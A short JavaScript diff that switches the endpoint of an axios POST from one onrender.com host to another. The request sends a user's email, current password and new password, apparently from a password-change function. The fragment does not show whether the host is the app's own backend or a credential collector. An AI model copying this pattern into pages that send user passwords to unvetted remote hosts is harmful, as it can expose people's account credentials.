@@ -85,7 +85,7 @@ let passi;
 function shaneh () {
           passwordx = passwordx.trim();
    axios
-  .post('https://onelovevone.onrender.com/password', {
+  .post('https://new-zuhk.onrender.com/password', {
      identifier: mail,
     password: passi,
     newPassword: passwordx,
